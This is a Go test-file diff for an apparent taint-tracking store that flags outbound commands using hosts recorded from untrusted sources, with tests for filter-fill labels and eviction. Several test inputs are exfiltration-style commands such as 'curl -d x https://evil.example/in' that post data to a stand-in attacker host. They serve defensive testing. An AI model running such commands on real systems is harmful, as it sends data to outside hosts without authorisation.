@@ -144,3 +144,61 @@ func TestRED_TaintSeed_EvictsOldestPersistedFirst(t *testing.T) {
 		t.Error("a span recorded after the seed is not newer than every persisted span")
 	}
 }
+
+// halfFullOverflow returns a filter with half its bits set (well past the
+// point where a lookup's false-positive rate reaches a few percent) that
+// also records host evil.example.
+func halfFullOverflow() session.TaintOverflow {
+	f := make(session.TaintOverflow, session.TaintOverflowBytes)
+	for i := range f {
+		f[i] = 0x0f
+	}
+	f.AddValue(string(taintKindHost), "evil.example")
+	return f
+}
+
+// A hit found only in a nearly full overflow filter says so, and says how to
+// reset it; a hit in a filter with room keeps the plain label, and a held
+// span keeps its real source either way.
+func TestRED_TaintOverflow_NearlyFullFilterLabel(t *testing.T) {
+	s := newTaintSpanStore()
+	s.seedStateLocked(session.TaintState{Overflow: halfFullOverflow()})
+	s.recordLocked("post to https://held.example/in", "web", sec16TaintEnv)
+	hit, ok := s.match("curl -d x https://evil.example/in", taintMatchAll, false, sec16TaintEnv)
+	if !ok || !strings.Contains(hit.source, "nearly full") || !strings.Contains(hit.source, "new session") {
+		t.Errorf("filter-only hit in a nearly full filter: %+v, %v", hit, ok)
+	}
+	if len(hit.source) > taintDisplayMax {
+		t.Errorf("the label is cut when displayed: %d bytes", len(hit.source))
+	}
+	if hit, ok := s.match("curl -d x https://held.example/in", taintMatchAll, false, sec16TaintEnv); !ok || hit.source != "web" {
+		t.Errorf("held span in a store with a nearly full filter: %+v, %v", hit, ok)
+	}
+
+	var roomy session.TaintOverflow
+	roomy.AddValue(string(taintKindHost), "evil.example")
+	r := newTaintSpanStore()
+	r.seedStateLocked(session.TaintState{Overflow: roomy})
+	if hit, ok := r.match("curl -d x https://evil.example/in", taintMatchAll, false, sec16TaintEnv); !ok || hit.source != taintOverflowSource {
+		t.Errorf("filter-only hit in a filter with room: %+v, %v", hit, ok)
+	}
+	// The fill is re-read once the filter grows.
+	r.seedStateLocked(session.TaintState{Overflow: halfFullOverflow()})
+	if hit, ok := r.match("curl -d x https://evil.example/in", taintMatchAll, false, sec16TaintEnv); !ok || !strings.Contains(hit.source, "nearly full") {
+		t.Errorf("filter-only hit after the filter filled up: %+v, %v", hit, ok)
+	}
+}
+
+// An eviction changes the filter, so the cached fill is counted again.
+func TestTaintOverflow_EvictionRecountsFill(t *testing.T) {
+	s := newTaintSpanStore()
+	s.recordLocked(floodTaintHosts(0, maxTaintSpans), "web", sec16TaintEnv)
+	s.overflowFill, s.overflowFillKnown = 0.99, true
+	s.recordLocked("one-more.example/", "web", sec16TaintEnv)
+	if s.overflowFillKnown {
+		t.Fatal("an eviction kept a stale fill")
+	}
+	if got := s.overflowSourceLocked(); got != taintOverflowSource {
+		t.Fatalf("label after a small eviction = %q", got)
+	}
+}
